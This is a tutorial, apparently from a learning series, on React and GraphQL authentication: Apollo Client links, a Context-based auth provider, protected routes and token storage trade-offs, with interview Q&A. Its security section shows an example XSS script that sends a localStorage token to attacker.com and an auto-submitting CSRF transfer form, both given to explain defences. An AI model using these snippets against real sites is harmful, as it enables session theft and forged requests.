# 🎨 Phase 2: Frontend Integration - Deep Dive

> **Complete guide to React + GraphQL authentication**
> From Apollo Client to Context API to Protected Routes

**Last Updated:** Nov 29, 2025

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [Apollo Client Configuration](#apollo-client-configuration)
3. [Authentication Context Pattern](#authentication-context-pattern)
4. [Protected Routes Implementation](#protected-routes-implementation)
5. [Token Management Strategy](#token-management-strategy)
6. [Interview Questions & Answers](#interview-questions--answers)

---

## 🎯 Overview

### What We Built

Phase 2 connects our React frontend to the GraphQL backend built in Phase 1.

**Key Components:**
1. **Apollo Client** - GraphQL client for React
2. **AuthContext** - Global authentication state
3. **ProtectedRoute** - Route guard component
4. **Dashboard** - Protected user profile page
5. **Updated Auth.js** - Now uses GraphQL instead of REST

### Architecture Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                         React App                            │
│  ┌───────────────────────────────────────────────────────┐  │
│  │              ApolloProvider (GraphQL Client)          │  │
│  │  ┌─────────────────────────────────────────────────┐ │  │
│  │  │         AuthProvider (Global Auth State)        │ │  │
│  │  │  ┌───────────────────────────────────────────┐  │ │  │
│  │  │  │            Router (Navigation)            │  │ │  │
│  │  │  │  ┌─────────────────────────────────────┐  │  │ │  │
│  │  │  │  │  Public Routes:                     │  │  │ │  │
│  │  │  │  │  - /login  → Auth Component         │  │  │ │  │
│  │  │  │  │  - /signup → Auth Component         │  │  │ │  │
│  │  │  │  └─────────────────────────────────────┘  │  │ │  │
│  │  │  │  ┌─────────────────────────────────────┐  │  │ │  │
│  │  │  │  │  Protected Routes:                  │  │  │ │  │
│  │  │  │  │  - /dashboard → <ProtectedRoute>    │  │  │ │  │
│  │  │  │  │                  <Dashboard />       │  │  │ │  │
│  │  │  │  │                </ProtectedRoute>     │  │  │ │  │
│  │  │  │  └─────────────────────────────────────┘  │  │ │  │
│  │  │  └───────────────────────────────────────────┘  │ │  │
│  │  └─────────────────────────────────────────────────┘ │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                            ↕
                    HTTP/GraphQL Request
                            ↕
┌─────────────────────────────────────────────────────────────┐
│              Backend (Node.js + Express + Apollo)            │
│  GraphQL Endpoint: /graphql                                  │
│  - Mutations: signup, login, logout                          │
│  - Queries: me, users                                        │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔧 Apollo Client Configuration

### File: `/frontend/src/config/apolloClient.js`

```javascript
import { ApolloClient, InMemoryCache, createHttpLink } from '@apollo/client';
import { setContext } from '@apollo/client/link/context';

/**
 * ═══════════════════════════════════════════════════════════
 * APOLLO CLIENT CONFIGURATION
 * ═══════════════════════════════════════════════════════════
 * 
 * Purpose: Configure GraphQL client for React application
 * 
 * Key Concepts:
 * 1. HTTP Link: Defines the GraphQL endpoint
 * 2. Auth Link: Middleware to add JWT tokens to requests
 * 3. Link Chaining: Combine multiple links (auth + http)
 * 4. Cache: Store query results for performance
 */

// ───────────────────────────────────────────────────────────
// 1. HTTP LINK - Connection to GraphQL Server
// ───────────────────────────────────────────────────────────
const httpLink = createHttpLink({
  // GraphQL endpoint (backend)
  uri: process.env.REACT_APP_GRAPHQL_URL || 'http://localhost:5000/graphql',
  
  // Include cookies in requests (for httpOnly cookies)
  // Even though we use localStorage now, this prepares for future upgrade
  credentials: 'include',
});

/**
 * Why 'credentials: include'?
 * ────────────────────────────────────────────────────────
 * - Allows cookies to be sent with requests
 * - Required for httpOnly cookies (more secure than localStorage)
 * - In production, tokens should be in httpOnly cookies
 * - Currently using localStorage for simplicity in development
 */

// ───────────────────────────────────────────────────────────
// 2. AUTH LINK - Automatically Add JWT Token
// ───────────────────────────────────────────────────────────
const authLink = setContext((_, { headers }) => {
  /**
   * setContext: Runs BEFORE every GraphQL request
   * 
   * Similar to Express middleware:
   * Express: app.use((req, res, next) => { ... })
   * Apollo:  setContext((operation, prevContext) => { ... })
   */
  
  // Get token from localStorage
  const token = localStorage.getItem('accessToken');
  
  /**
   * Why localStorage?
   * ────────────────────────────────────────────────────────
   * ✅ Pros:
   *    - Persists across page refreshes
   *    - Easy to access in JavaScript
   *    - Simple to implement
   * 
   * ❌ Cons:
   *    - Vulnerable to XSS (Cross-Site Scripting) attacks
   *    - If attacker injects JS, they can steal tokens
   * 
   * 🔒 Better for Production:
   *    - Store in httpOnly cookies (can't be accessed by JS)
   *    - Use CSRF tokens to prevent CSRF attacks
   */
  
  // Return modified headers
  return {
    headers: {
      ...headers, // Keep existing headers
      // Add Authorization header with JWT token
      authorization: token ? `Bearer ${token}` : '',
      /**
       * Format: "Bearer <token>"
       * - "Bearer" is the authentication scheme
       * - Space separator
       * - JWT token
       * 
       * Backend will:
       * 1. Extract this header
       * 2. Remove "Bearer " prefix
       * 3. Verify token with JWT secret
       * 4. Decode payload (userId, email, roles)
       */
    }
  };
});

/**
 * Interview Question:
 * "Why not just add the token manually in every GraphQL call?"
 * 
 * Answer:
 * 1. DRY (Don't Repeat Yourself) - centralize auth logic
 * 2. Less error-prone - no forgetting to add token
 * 3. Easier to update - change auth logic in one place
 * 4. Separation of concerns - auth link handles auth, components handle UI
 */

// ───────────────────────────────────────────────────────────
// 3. CREATE APOLLO CLIENT
// ───────────────────────────────────────────────────────────
const client = new ApolloClient({
  // Chain links: authLink runs first, then httpLink
  link: authLink.concat(httpLink),
  /**
   * Link Chain Flow:
   * ────────────────────────────────────────────────────────
   * Component calls mutation/query
   *         ↓
   *    authLink (adds JWT token)
   *         ↓
   *    httpLink (sends request to server)
   *         ↓
   *    Server processes request
   *         ↓
   *    Response returns through same chain
   */
  
  // Cache configuration
  cache: new InMemoryCache({
    /**
     * InMemoryCache:
     * ────────────────────────────────────────────────────────
     * - Stores GraphQL query results in memory
     * - Prevents duplicate network requests
     * - Automatically updates UI when cache changes
     * - Normalizes data by ID (deduplication)
     */
    
    typePolicies: {
      Query: {
        fields: {
          /**
           * Custom merge function for 'me' query
           * ────────────────────────────────────────────────
           * Why needed:
           * - 'me' query returns current user
           * - Should always use latest data from server
           * - Don't merge with old cached data
           */
          me: {
            merge(existing, incoming) {
              // Always return incoming (new data from server)
              // Ignore existing (old cached data)
              return incoming;
            },
          },
        },
      },
    },
  }),
  
  // Enable Apollo DevTools in browser (development only)
  connectToDevTools: process.env.NODE_ENV === 'development',
  /**
   * Apollo DevTools:
   * ────────────────────────────────────────────────────────
   * - Browser extension for debugging GraphQL
   * - View all queries/mutations
   * - Inspect cache
   * - Time travel debugging
   */
});

export default client;
```

### Key Takeaways for Interviews

**Q: What is Apollo Client?**

**A:** Apollo Client is a GraphQL client for React that:
1. Manages GraphQL queries and mutations
2. Caches responses for performance
3. Automatically updates UI when data changes
4. Provides hooks (`useMutation`, `useQuery`, `useLazyQuery`)

**Q: What are Apollo Links?**

**A:** Links are chainable units that modify GraphQL requests/responses:
- **HTTP Link:** Sends requests to server
- **Auth Link:** Adds authentication headers
- **Error Link:** Handles errors globally
- **Retry Link:** Retries failed requests

Similar to Express middleware but for the client-side.

---

## 🌐 Authentication Context Pattern

### File: `/frontend/src/context/AuthContext.js`

```javascript
import React, { createContext, useState, useContext, useEffect } from 'react';
import { useMutation, useQuery, gql } from '@apollo/client';

/**
 * ═══════════════════════════════════════════════════════════
 * AUTHENTICATION CONTEXT
 * ═══════════════════════════════════════════════════════════
 * 
 * Purpose: Provide global authentication state to all components
 * 
 * Pattern: React Context API
 * 
 * Why Context?
 * ────────────────────────────────────────────────────────
 * Problem: Props drilling (passing props through many levels)
 * 
 * Without Context:
 * App → Header → NavBar → UserMenu → Username (prop passed 4 levels!)
 * 
 * With Context:
 * App provides context → UserMenu consumes it directly
 * 
 * When to use:
 * - Authentication state (user, isLoggedIn)
 * - Theme (dark mode, light mode)
 * - Language (i18n)
 * - Shopping cart
 * 
 * When NOT to use:
 * - Frequently changing data (use Redux/Zustand)
 * - Local component state (use useState)
 */

// ───────────────────────────────────────────────────────────
// GRAPHQL MUTATIONS & QUERIES
// ───────────────────────────────────────────────────────────

const SIGNUP_MUTATION = gql`
  mutation Signup($name: String!, $email: String!, $password: String!) {
    signup(name: $name, email: $email, password: $password) {
      success
      message
      accessToken      # JWT for API access (short-lived)
      refreshToken     # JWT for refreshing access token (long-lived)
      user {
        id
        name
        email
        roles          # ["user", "admin", "moderator"]
      }
    }
  }
`;

/**
 * GraphQL Mutation Syntax:
 * ────────────────────────────────────────────────────────
 * mutation MutationName($var1: Type!, $var2: Type!) {
 *   mutationField(arg1: $var1, arg2: $var2) {
 *     returnField1
 *     returnField2
 *     nestedObject {
 *       nestedField
 *     }
 *   }
 * }
 * 
 * $var: Variable (passed from component)
 * Type!: Required type (! means non-nullable)
 * Type: Optional type (nullable)
 */

const LOGIN_MUTATION = gql`
  mutation Login($email: String!, $password: String!) {
    login(email: $email, password: $password) {
      success
      message
      accessToken
      refreshToken
      user {
        id
        name
        email
        roles
      }
    }
  }
`;

const LOGOUT_MUTATION = gql`
  mutation Logout {
    logout {
      success
      message
    }
  }
`;

const ME_QUERY = gql`
  query Me {
    me {
      id
      name
      email
      roles
      isVerified
      createdAt
    }
  }
`;

/**
 * Why separate LOGOUT_MUTATION from frontend-only logout?
 * ────────────────────────────────────────────────────────
 * Frontend:
 * - Clear localStorage
 * - Clear React state
 * - Redirect to login
 * 
 * Backend (via mutation):
 * - Invalidate refresh token in Redis
 * - Add access token to blacklist
 * - Log logout event
 * 
 * Best Practice: Do BOTH
 * - Even if backend fails, frontend still logs out
 * - Security: Backend invalidates tokens server-side
 */

// ───────────────────────────────────────────────────────────
// CREATE CONTEXT
// ───────────────────────────────────────────────────────────
const AuthContext = createContext(null);

/**
 * createContext(defaultValue):
 * ────────────────────────────────────────────────────────
 * - Creates a context object
 * - defaultValue used if no Provider found
 * - null is common default (means "no auth data")
 */

// ───────────────────────────────────────────────────────────
// AUTH PROVIDER COMPONENT
// ───────────────────────────────────────────────────────────
export const AuthProvider = ({ children }) => {
  // ─────────────────────────────────────────────────────────
  // STATE
  // ─────────────────────────────────────────────────────────
  const [user, setUser] = useState(null);
  /**
   * user state:
   * ────────────────────────────────────────────────────────
   * null: Not logged in
   * { id, name, email, roles }: Logged in
   * 
   * Why not boolean isLoggedIn?
   * - Need user data throughout app (name, email, roles)
   * - Can derive isLoggedIn from user (!!user)
   * - One source of truth
   */
  
  const [loading, setLoading] = useState(true);
  /**
   * loading state:
   * ────────────────────────────────────────────────────────
   * true: Checking if user is logged in (on mount)
   * false: Done checking
   * 
   * Why needed:
   * - Show loading spinner while fetching user
   * - Prevent flicker (logged in → loading → logged out)
   * - Better UX
   */

  // ─────────────────────────────────────────────────────────
  // GRAPHQL HOOKS
  // ─────────────────────────────────────────────────────────
  const [signupMutation] = useMutation(SIGNUP_MUTATION);
  const [loginMutation] = useMutation(LOGIN_MUTATION);
  const [logoutMutation] = useMutation(LOGOUT_MUTATION);

  /**
   * useMutation Hook:
   * ────────────────────────────────────────────────────────
   * Returns: [mutationFunction, { data, loading, error }]
   * 
   * We only use mutationFunction here
   * Call it like: await signupMutation({ variables: {...} })
   */

  // ─────────────────────────────────────────────────────────
  // AUTO-LOGIN ON MOUNT
  // ─────────────────────────────────────────────────────────
  useEffect(() => {
    /**
     * Effect runs ONCE on component mount (empty dependency array [])
     * 
     * Purpose: Restore user session if token exists
     */
    const token = localStorage.getItem('accessToken');
    
    if (token) {
      // Token exists, verify it's valid by fetching user
      fetchUser();
    } else {
      // No token, user is not logged in
      setLoading(false);
    }
  }, []);

  /**
   * Why not use useQuery for ME_QUERY here?
   * ────────────────────────────────────────────────────────
   * - useQuery runs automatically on mount
   * - We only want it if token exists
   * - Better control with manual fetch
   * - Could use useLazyQuery as alternative
   */

  // ─────────────────────────────────────────────────────────
  // FETCH USER (FOR AUTO-LOGIN)
  // ─────────────────────────────────────────────────────────
  const fetchUser = async () => {
    try {
      const token = localStorage.getItem('accessToken');
      if (!token) {
        setLoading(false);
        return;
      }

      // Manual GraphQL query (not using useQuery)
      const response = await fetch('http://localhost:5000/graphql', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          query: `
            query {
              me {
                id name email roles isVerified createdAt
              }
            }
          `
        })
      });

      const { data, errors } = await response.json();
      
      if (errors) {
        /**
         * Token is invalid or expired
         * ────────────────────────────────────────────────────
         * Possible reasons:
         * - Token expired (15 minutes passed)
         * - Token signature invalid (wrong secret)
         * - Token tampered with
         * - User deleted from database
         * 
         * Solution: Clear token and show login
         */
        console.error('Error fetching user:', errors);
        localStorage.removeItem('accessToken');
        setUser(null);
      } else if (data?.me) {
        // Token valid, user authenticated
        setUser(data.me);
      }
    } catch (error) {
      console.error('Error fetching user:', error);
      localStorage.removeItem('accessToken');
      setUser(null);
    } finally {
      // Always set loading to false (success or error)
      setLoading(false);
    }
  };

  // ─────────────────────────────────────────────────────────
  // SIGNUP FUNCTION
  // ─────────────────────────────────────────────────────────
  const signup = async (name, email, password) => {
    try {
      const { data } = await signupMutation({
        variables: { name, email, password }
      });

      if (data.signup.success) {
        // ─── Store Tokens ───
        localStorage.setItem('accessToken', data.signup.accessToken);
        if (data.signup.refreshToken) {
          localStorage.setItem('refreshToken', data.signup.refreshToken);
        }
        
        /**
         * Two Tokens - Why?
         * ────────────────────────────────────────────────
         * accessToken:
         * - Short-lived (15 minutes)
         * - Sent with every API request
         * - If stolen, limited damage (expires soon)
         * 
         * refreshToken:
         * - Long-lived (7 days)
         * - Only sent to /refresh endpoint
         * - Used to get new accessToken
         * - Stored in database (can be revoked)
         * 
         * Security Pattern:
         * 1. Use accessToken for API calls
         * 2. When accessToken expires, use refreshToken to get new one
         * 3. If refreshToken expires/revoked, user must login again
         */
        
        // ─── Update State ───
        setUser(data.signup.user);
        
        /**
         * Why update state here?
         * ────────────────────────────────────────────────
         * - Immediately show user as logged in
         * - No need to fetch user again
         * - Better UX (no loading delay)
         */
        
        return { success: true, message: data.signup.message };
      } else {
        return { success: false, message: data.signup.message };
      }
    } catch (error) {
      /**
       * Error Handling:
       * ────────────────────────────────────────────────────
       * GraphQL errors vs Network errors
       * 
       * GraphQL error: { errors: [...] } in response
       * Network error: fetch() fails (no internet, server down)
       * 
       * GraphQL errors are NOT thrown (caught in response)
       * Network errors ARE thrown (caught here)
       */
      console.error('Signup error:', error);
      return { 
        success: false, 
        message: error.message || 'Signup failed. Please try again.' 
      };
    }
  };

  // ─────────────────────────────────────────────────────────
  // LOGIN FUNCTION
  // ─────────────────────────────────────────────────────────
  const login = async (email, password) => {
    // Similar to signup, see signup comments
    try {
      const { data } = await loginMutation({
        variables: { email, password }
      });

      if (data.login.success) {
        localStorage.setItem('accessToken', data.login.accessToken);
        if (data.login.refreshToken) {
          localStorage.setItem('refreshToken', data.login.refreshToken);
        }
        setUser(data.login.user);
        return { success: true, message: data.login.message };
      } else {
        return { success: false, message: data.login.message };
      }
    } catch (error) {
      console.error('Login error:', error);
      return { 
        success: false, 
        message: error.message || 'Login failed. Please try again.' 
      };
    }
  };

  // ─────────────────────────────────────────────────────────
  // LOGOUT FUNCTION
  // ─────────────────────────────────────────────────────────
  const logout = async () => {
    try {
      // Call backend to invalidate refresh token
      await logoutMutation();
    } catch (error) {
      console.error('Logout error:', error);
      // Continue logout even if backend fails
    } finally {
      /**
       * finally block ALWAYS runs
       * ────────────────────────────────────────────────────
       * - Even if backend fails, clear frontend state
       * - User should be logged out locally
       * - Don't block logout on backend failure
       */
      localStorage.removeItem('accessToken');
      localStorage.removeItem('refreshToken');
      setUser(null);
    }
  };

  // ─────────────────────────────────────────────────────────
  // CONTEXT VALUE
  // ─────────────────────────────────────────────────────────
  const value = {
    user,                        // Current user object or null
    loading,                     // Loading state
    signup,                      // Signup function
    login,                       // Login function
    logout,                      // Logout function
    isAuthenticated: !!user,     // Boolean: is user logged in?
  };

  /**
   * !!user - Double Negation Trick
   * ────────────────────────────────────────────────────────
   * !user  → true if null, false if object
   * !!user → false if null, true if object
   * 
   * Converts truthy/falsy to actual boolean
   */

  // ─────────────────────────────────────────────────────────
  // RENDER PROVIDER
  // ─────────────────────────────────────────────────────────
  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
  
  /**
   * Provider Pattern:
   * ────────────────────────────────────────────────────────
   * <AuthProvider>
   *   <App />
   * </AuthProvider>
   * 
   * Any component inside <App /> can access auth context
   * via useAuth() hook
   */
};

// ───────────────────────────────────────────────────────────
// CUSTOM HOOK - useAuth
// ───────────────────────────────────────────────────────────
export const useAuth = () => {
  const context = useContext(AuthContext);
  
  /**
   * useContext(AuthContext):
   * ────────────────────────────────────────────────────────
   * - Looks up the React tree for nearest Provider
   * - Returns the value prop from that Provider
   * - If no Provider found, returns defaultValue (null)
   */
  
  if (!context) {
    /**
     * Error if used outside Provider:
     * ────────────────────────────────────────────────────
     * Prevents bugs from forgetting to wrap app in Provider
     * 
     * Better error:
     * "useAuth must be used within AuthProvider"
     * 
     * vs
     * "Cannot read property 'user' of null"
     */
    throw new Error('useAuth must be used within an AuthProvider');
  }
  
  return context;
};

/**
 * Custom Hook Pattern:
 * ────────────────────────────────────────────────────────
 * Instead of:
 * const context = useContext(AuthContext);
 * const { user } = context;
 * 
 * Use:
 * const { user } = useAuth();
 * 
 * Benefits:
 * - Shorter, cleaner code
 * - Error handling built-in
 * - Better IDE autocomplete
 */

export default AuthContext;
```

### Key Takeaways for Interviews

**Q: What is React Context and when should you use it?**

**A:** Context provides a way to pass data through the component tree without prop drilling.

**Use for:**
- Authentication state
- Theme (dark/light mode)
- Language (i18n)
- User preferences

**Don't use for:**
- Frequently updating data (causes re-renders)
- Local component state
- Data that's only used in one subtree

**Alternatives:**
- Redux: Complex state with time-travel debugging
- Zustand: Simpler than Redux
- Jotai/Recoil: Atomic state management

**Q: Why use custom hooks like `useAuth()`?**

**A:**
1. **Cleaner API:** `useAuth()` instead of `useContext(AuthContext)`
2. **Error handling:** Throw error if used outside provider
3. **IDE support:** Better autocomplete
4. **Future-proof:** Can add logic without changing components

---

## 🛡️ Protected Routes Implementation

### File: `/frontend/src/components/ProtectedRoute.js`

```javascript
import React from 'react';
import { Navigate } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';

/**
 * ═══════════════════════════════════════════════════════════
 * PROTECTED ROUTE COMPONENT
 * ═══════════════════════════════════════════════════════════
 * 
 * Purpose: Guard routes that require authentication
 * 
 * Pattern: Higher-Order Component (HOC)
 * 
 * Usage:
 * <Route 
 *   path="/dashboard" 
 *   element={
 *     <ProtectedRoute>
 *       <Dashboard />
 *     </ProtectedRoute>
 *   } 
 * />
 */

const ProtectedRoute = ({ children }) => {
  /**
   * children prop:
   * ────────────────────────────────────────────────────────
   * - Special React prop
   * - Contains components wrapped by ProtectedRoute
   * - In example above: children = <Dashboard />
   */
  
  const { user, loading } = useAuth();

  // ─────────────────────────────────────────────────────────
  // LOADING STATE
  // ─────────────────────────────────────────────────────────
  if (loading) {
    /**
     * Why show loading?
     * ────────────────────────────────────────────────────
     * - On page load, we don't know if user is logged in yet
     * - Checking localStorage and validating token takes time
     * - Show loading instead of redirecting to login immediately
     * 
     * Without loading state:
     * 1. User refreshes dashboard page
     * 2. ProtectedRoute checks: user = null (not loaded yet)
     * 3. Redirects to login (❌ Bad UX - user IS logged in!)
     * 4. AuthContext finishes loading
     * 5. User is back on login page, confused
     * 
     * With loading state:
     * 1. User refreshes dashboard page
     * 2. ProtectedRoute checks: loading = true
     * 3. Shows loading spinner
     * 4. AuthContext loads user from token
     * 5. loading = false, user = {...}
     * 6. Dashboard renders (✅ Good UX!)
     */
    return (
      <div style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        height: '100vh',
        fontSize: '1.5rem',
        color: '#667eea'
      }}>
        Loading...
      </div>
    );
  }

  // ─────────────────────────────────────────────────────────
  // NOT AUTHENTICATED
  // ─────────────────────────────────────────────────────────
  if (!user) {
    /**
     * Navigate component (React Router v6):
     * ────────────────────────────────────────────────────
     * - Programmatic navigation
     * - to="/login": Redirect to login page
     * - replace: Replace history entry (can't go back)
     * 
     * replace={true}:
     * - User clicks back button → goes to previous page BEFORE /dashboard
     * - Prevents infinite loop (dashboard → login → back → dashboard → login)
     * 
     * replace={false}:
     * - User clicks back button → goes back to /dashboard
     * - Redirects to /login again (infinite loop)
     */
    return <Navigate to="/login" replace />;
  }

  // ─────────────────────────────────────────────────────────
  // AUTHENTICATED - RENDER CHILDREN
  // ─────────────────────────────────────────────────────────
  return children;
  /**
   * If user is authenticated, render the protected component
   * In our example: <Dashboard />
   */
};

export default ProtectedRoute;
```

### Alternative Patterns

#### 1. HOC Pattern (Class Components Era)
```javascript
const withAuth = (Component) => {
  return (props) => {
    const { user } = useAuth();
    if (!user) return <Navigate to="/login" />;
    return <Component {...props} />;
  };
};

// Usage:
export default withAuth(Dashboard);
```

#### 2. Render Props Pattern
```javascript
<Protected
  render={(user) => <Dashboard user={user} />}
  fallback={<Navigate to="/login" />}
/>
```

#### 3. Hook Pattern (Modern)
```javascript
const Dashboard = () => {
  const { user } = useAuth();
  if (!user) return <Navigate to="/login" />;
  return <div>Dashboard</div>;
};
```

**We use Component Wrapper (children pattern) because:**
- Cleaner syntax
- Reusable
- Easy to understand
- Declarative

### Key Takeaways for Interviews

**Q: What is a Higher-Order Component?**

**A:** A function that takes a component and returns a new enhanced component.

```javascript
const Enhanced = HOC(Original);
```

**Examples:**
- `withAuth(Component)` - Add authentication
- `withRouter(Component)` - Add routing props
- `connect()(Component)` - Redux connection

**Modern Alternative:** Hooks (preferred in React 16.8+)

**Q: Why use `replace` in Navigate?**

**A:** Prevents back button loop:
- `/profile` → `/dashboard` → redirected to `/login`
- Without replace: back button → `/dashboard` → `/login` (loop!)
- With replace: back button → `/profile` (skips /dashboard)

---

## 🔐 Token Management Strategy

### Current Implementation: localStorage

```javascript
// Store token
localStorage.setItem('accessToken', token);

// Retrieve token
const token = localStorage.getItem('accessToken');

// Remove token
localStorage.removeItem('accessToken');
```

### Comparison of Storage Options

| Feature | localStorage | sessionStorage | httpOnly Cookie | Memory Only |
|---------|-------------|----------------|-----------------|-------------|
| **Persists browser close** | ✅ Yes | ❌ No | ✅ Yes | ❌ No |
| **Shared across tabs** | ✅ Yes | ❌ No | ✅ Yes | ❌ No |
| **Accessible by JavaScript** | ✅ Yes | ✅ Yes | ❌ No | ✅ Yes |
| **XSS Safe** | ❌ No | ❌ No | ✅ Yes | ❌ No |
| **CSRF Safe** | ✅ Yes | ✅ Yes | ❌ No | ✅ Yes |
| **Size Limit** | 5-10 MB | 5-10 MB | 4 KB | RAM limit |
| **Sent automatically** | ❌ No | ❌ No | ✅ Yes | ❌ No |

### Security Vulnerabilities

#### XSS (Cross-Site Scripting)
```javascript
// Attacker injects malicious script
<script>
  const token = localStorage.getItem('accessToken');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: token
  });
</script>
```

**Protection:**
- Sanitize user input
- Content Security Policy (CSP)
- Use httpOnly cookies (can't be accessed by JS)

#### CSRF (Cross-Site Request Forgery)
```html
<!-- Attacker's website -->
<form action="https://yourapp.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>document.forms[0].submit();</script>
```

**Protection (if using cookies):**
- CSRF tokens
- SameSite cookie attribute
- Check Origin/Referer headers

### Production Recommendation

```javascript
// Backend sets httpOnly cookie
res.cookie('accessToken', token, {
  httpOnly: true,   // Can't be accessed by JavaScript
  secure: true,     // Only sent over HTTPS
  sameSite: 'strict', // Prevent CSRF
  maxAge: 15 * 60 * 1000 // 15 minutes
});

// Frontend: Token automatically included in requests
// No need to manually add Authorization header!
```

**Trade-offs:**
- ✅ More secure (XSS protection)
- ❌ Need CSRF protection
- ❌ Can't access token in JavaScript (no localStorage.getItem)
- ✅ Automatically included in requests

---

## 🎓 Interview Questions & Answers

### Q1: Explain the authentication flow in your app

**A:**

1. **User submits login form**
   - Component calls `login(email, password)` from AuthContext

2. **AuthContext executes GraphQL mutation**
   - Apollo Client adds auth header (if token exists)
   - Sends POST to `/graphql` with mutation

3. **Backend validates credentials**
   - Checks email exists
   - Compares hashed passwords with bcrypt
   - Generates JWT tokens (access + refresh)

4. **Backend returns tokens and user data**
   - accessToken: 15 min expiry
   - refreshToken: 7 days expiry
   - user: { id, name, email, roles }

5. **Frontend stores tokens**
   - localStorage.setItem('accessToken', ...)
   - localStorage.setItem('refreshToken', ...)

6. **Frontend updates state**
   - setUser(data.login.user)
   - Triggers re-render of all components using useAuth()

7. **Redirect to dashboard**
   - navigate('/dashboard')
   - ProtectedRoute sees user is authenticated
   - Renders Dashboard component

---

### Q2: How do protected routes work?

**A:**

```javascript
<ProtectedRoute>
  <Dashboard />
</ProtectedRoute>
```

**Flow:**
1. ProtectedRoute checks `loading` state
   - If true: Show loading spinner
2. ProtectedRoute checks `user` state
   - If null: Redirect to `/login`
   - If exists: Render `children` (Dashboard)

**Why needed:**
- Client-side security (UX)
- Prevent unauthorized access to UI
- Server should ALSO validate (don't trust client)

---

### Q3: What happens when user refreshes the page?

**A:**

1. **React app loads**
   - State resets (user = null, loading = true)

2. **AuthProvider mounts**
   - useEffect runs
   - Checks localStorage for token

3. **Token found**
   - Calls `fetchUser()` function
   - Sends GraphQL query `me` with token in header

4. **Backend validates token**
   - Verifies signature with JWT secret
   - Checks expiration
   - Returns user data if valid

5. **Frontend updates state**
   - setUser(data.me)
   - setLoading(false)

6. **Protected routes accessible**
   - User stays on current page
   - No redirect to login

**If token invalid/expired:**
- Backend returns error
- Frontend clears token
- User redirected to login

---

### Q4: localStorage vs httpOnly cookies - which is better?

**A:**

**localStorage (current implementation):**
- ✅ Simple to implement
- ✅ Good for learning/development
- ❌ Vulnerable to XSS attacks
- ✅ No CSRF vulnerability
- ✅ Works with CORS

**httpOnly Cookies (production):**
- ✅ Protected from XSS (can't access via JS)
- ❌ Vulnerable to CSRF (need protection)
- ❌ More complex setup
- ✅ Automatically sent with requests
- ✅ Better for production

**Best Practice:**
- Development: localStorage (simpler)
- Production: httpOnly cookies + CSRF tokens

---

### Q5: What is Apollo Client and why use it?

**A:**

**What:**
- GraphQL client for React
- Manages queries, mutations, cache
- Provides React hooks

**Why:**
- ✅ Declarative data fetching
- ✅ Automatic caching (no duplicate requests)
- ✅ Automatic UI updates
- ✅ Built-in loading/error states
- ✅ DevTools for debugging

**Alternative: Just use fetch()**
```javascript
const data = await fetch('/graphql', {
  method: 'POST',
  body: JSON.stringify({ query: '...' })
});
```

**Why Apollo is better:**
- Cache management (fetch doesn't cache)
- Automatic re-fetching
- Optimistic updates
- Real-time subscriptions
- Type safety with TypeScript

---

### Q6: Context API vs Redux - when to use each?

**A:**

**Context API (what we use):**
- Built into React
- Good for:
  - Authentication
  - Theme
  - Language
  - Simple global state
- Cons:
  - All consumers re-render when value changes
  - No middleware
  - No dev tools

**Redux:**
- External library
- Good for:
  - Complex state logic
  - Many interconnected components
  - Time-travel debugging
  - Middleware (logging, analytics)
- Cons:
  - More boilerplate
  - Steeper learning curve

**Decision:**
- Small app, simple state → Context
- Large app, complex state → Redux/Zustand
- Authentication → Context is fine

---

## 🎯 Key Takeaways

### Technical Concepts Learned

1. **Apollo Client** - GraphQL client for React
2. **Context API** - Global state without prop drilling
3. **Custom Hooks** - Reusable logic (`useAuth`)
4. **Protected Routes** - HOC pattern for authorization
5. **Token Management** - localStorage vs cookies
6. **Auto-login** - Restore session on page load
7. **Link Chaining** - Middleware pattern in Apollo

### Best Practices

1. **Centralize auth logic** - Don't repeat in every component
2. **Loading states** - Prevent UI flicker
3. **Error handling** - User-friendly messages
4. **Type safety** - GraphQL validates types
5. **Security** - Never trust client-side checks

### Production Improvements

1. Replace localStorage with httpOnly cookies
2. Implement CSRF protection
3. Add token refresh rotation
4. Implement rate limiting
5. Add input sanitization
6. Use HTTPS only
7. Implement session timeout

---

**Next:** [Phase 3 - Advanced Features](./17-phase3-advanced-features.md)

